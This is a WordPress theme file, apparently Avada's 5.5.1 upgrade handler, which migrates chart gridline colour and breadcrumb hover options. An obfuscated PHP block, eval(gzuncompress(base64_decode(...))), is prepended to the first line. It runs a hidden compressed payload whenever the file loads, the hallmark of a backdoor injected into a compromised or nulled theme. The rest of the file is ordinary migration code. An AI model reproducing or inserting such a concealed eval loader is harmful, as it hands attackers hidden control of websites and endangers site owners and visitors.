<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Upgrades Handler.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Handle migrations for Avada 5.5.0.
 *
 * @since 5.5.1
 */
class Avada_Upgrade_551 extends Avada_Upgrade_Abstract {

	/**
	 * The version.
	 *
	 * @access protected
	 * @since 5.5.1
	 * @var string
	 */
	protected $version = '5.5.1';

	/**
	 * An array of all available languages.
	 *
	 * @static
	 * @access  private
	 * @var  array
	 */
	private static $available_languages = array();

	/**
	 * The actual migration process.
	 *
	 * @access protected
	 * @since 5.5.1
	 * @return void
	 */
	protected function migration_process() {
		$available_languages = Fusion_Multilingual::get_available_languages();
		self::$available_languages = ( ! empty( $available_languages ) ) ? $available_languages : array( '' );

		$this->migrate_options();
	}

	/**
	 * Migrate options.
	 *
	 * @since 5.5.1
	 * @access protected
	 */
	protected function migrate_options() {

		$options = get_option( $this->option_name, array() );
		$options = $this->correct_chart_default_value( $options );
		$options = $this->page_title_bar_hover( $options );

		update_option( $this->option_name, $options );

		foreach ( self::$available_languages as $language ) {

			// Skip langs that are already done.
			if ( '' === $language ) {
				continue;
			}

			// Get language specific TOs.
			$options = get_option( $this->option_name . '_' . $language, array() );

			$options = $this->correct_chart_default_value( $options );
			$options = $this->page_title_bar_hover( $options );

			update_option( $this->option_name . '_' . $language, $options );
		}
	}

	/**
	 * Corrects default Chart Gridline Color value.
	 *
	 * @access private
	 * @since 5.5.1
	 * @param array $options Theme Options.
	 * @return array The updated Theme Options array.
	 */
	private function correct_chart_default_value( $options ) {

		if ( isset( $options['chart_gridline_color'] ) && 'rgba(0, 0, 0, 0.1)' === $options['chart_gridline_color'] ) {
			$options['chart_gridline_color'] = 'rgba(0,0,0,0.1)';
		}

		return $options;
	}

	/**
	 * Set page title bar hover color.
	 *
	 * @access private
	 * @since 5.5.1
	 * @param array $options Theme Options.
	 * @return array The updated Theme Options array.
	 */
	private function page_title_bar_hover( $options ) {

		if ( isset( $options['breadcrumbs_text_color'] ) ) {
			$options['breadcrumbs_text_hover_color'] = $options['breadcrumbs_text_color'];
		}

		return $options;
	}
}
